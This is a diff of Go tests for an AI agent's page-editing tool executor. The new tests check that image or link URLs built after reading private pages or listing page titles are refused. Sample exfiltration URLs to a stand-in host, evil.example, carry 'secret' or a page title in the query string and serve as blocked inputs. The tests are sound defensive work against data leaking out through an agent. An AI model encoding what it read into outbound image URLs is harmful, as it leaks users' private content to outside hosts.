@@ -303,6 +303,25 @@ func TestClientRefusesRedirects(t *testing.T) {
 	}
 }
 
+// A list item rewritten with "children": [] keeps its nested items, as one
+// written without children does; as a paragraph, it is refused.
+func TestReplaceWithEmptyChildrenKeepsNestedItems(t *testing.T) {
+	c := page()
+	c.Children[2].Children = []*doc.Node{{ID: "l2", Type: "bulleted_list"}}
+	x := executor(c)
+	out := x.Call("replace_block", map[string]any{"id": "l1", "block": map[string]any{"type": "bulleted_list", "text": "renamed", "children": []any{}}})
+	if e, ok := out["error"]; ok {
+		t.Fatal(e)
+	}
+	if c.Find("l2") == nil {
+		t.Error("the nested item went")
+	}
+	out = x.Call("replace_block", map[string]any{"id": "l1", "block": map[string]any{"type": "paragraph", "text": "flat", "children": []any{}}})
+	if e, _ := out["error"].(string); !strings.Contains(e, "nested items") || len(x.Ops) != 1 {
+		t.Errorf("out %v, ops %d", out, len(x.Ops))
+	}
+}
+
 // A table rewritten as a list leaves its cells out of the op, as the server
 // does.
 func TestReplaceTableWithList(t *testing.T) {
@@ -364,13 +383,68 @@ func TestURLsAfterReadingAnotherPage(t *testing.T) {
 	if out := x.Call("replace_block", map[string]any{"id": "p1", "block": map[string]any{"type": "image", "image": map[string]any{"url": "https://evil.example/y.png"}}}); out["error"] == nil {
 		t.Error("replaced a block with an image of a new URL")
 	}
-	for _, args := range []map[string]any{image("https://example.com/here.png"), image("https://example.com/new.png"), card("https://example.com/spec")} {
+	for _, args := range []map[string]any{image("https://example.com/here.png"), card("https://example.com/spec")} {
 		if out := x.Call("insert_blocks", args); out["error"] != nil {
 			t.Errorf("a URL it saw: %v", out)
 		}
 	}
-	if n := len(x.Ops); n != 4 {
+	// What the run wrote is not what it found, though it is on the page.
+	if out := x.Call("insert_blocks", image("https://example.com/new.png")); out["error"] == nil {
+		t.Error("used a URL the run wrote itself")
+	}
+	if n := len(x.Ops); n != 3 {
 		t.Errorf("%d ops", n)
+	}
+}
+
+// A URL the run wrote, into a subpage it made or into this page, does not
+// count as seen when it reads that page back: it could carry what it read.
+func TestURLsWrittenThisRunStayUnseen(t *testing.T) {
+	leak := "https://evil.example/x.png?d=secret"
+	written := map[string]any{"page": map[string]any{"id": "sub"}, "blocks": []map[string]any{{"id": "b", "type": "paragraph", "text": "[x](" + leak + ")"}}}
+	x := executor(page())
+	x.Ctx.CreateSubpage = func(string, []*doc.Node) (string, error) { return "sub", nil }
+	x.Ctx.ReadOtherPage = func(id string) map[string]any {
+		if id == "private" {
+			return map[string]any{"page": map[string]any{"id": id}, "blocks": []map[string]any{{"id": "s", "type": "paragraph", "text": "secret"}}}
+		}
+		return written
+	}
+	if out := x.Call("read_other_page", map[string]any{"page_id": "private"}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	if out := x.Call("create_subpage", map[string]any{"title": "Notes", "blocks": []any{map[string]any{"type": "paragraph", "text": "[x](" + leak + ")"}}}); out["error"] != nil {
+		t.Fatal(out)
+	}
+	image := map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "image", "image": map[string]any{"url": leak}}}}
+	for _, id := range []string{"sub", "page"} {
+		if out := x.Call("read_other_page", map[string]any{"page_id": id}); out["error"] != nil {
+			t.Fatal(out)
+		}
+		if out := x.Call("insert_blocks", image); out["error"] == nil {
+			t.Errorf("an image of a URL read back from %s", id)
+		}
+	}
+}
+
+// Listing the user's pages counts as reading them: a title could leave in
+// an image's URL too.
+func TestURLsAfterListingPages(t *testing.T) {
+	c := page()
+	c.Children = append(c.Children, &doc.Node{ID: "i1", Type: "image", Data: map[string]any{"url": "https://example.com/here.png"}})
+	x := executor(c)
+	x.Ctx.ListPages = func() []map[string]any { return []map[string]any{{"id": "p", "title": "Salary review"}} }
+	if out := x.Call("list_pages", nil); out["error"] != nil {
+		t.Fatal(out)
+	}
+	image := func(u string) map[string]any {
+		return map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "image", "image": map[string]any{"url": u}}}}
+	}
+	if out := x.Call("insert_blocks", image("https://evil.example/x.png?t=Salary+review")); out["error"] == nil {
+		t.Error("an image of a new URL after listing pages")
+	}
+	if out := x.Call("insert_blocks", image("https://example.com/here.png")); out["error"] != nil {
+		t.Errorf("a URL on this page: %v", out)
 	}
 }
 
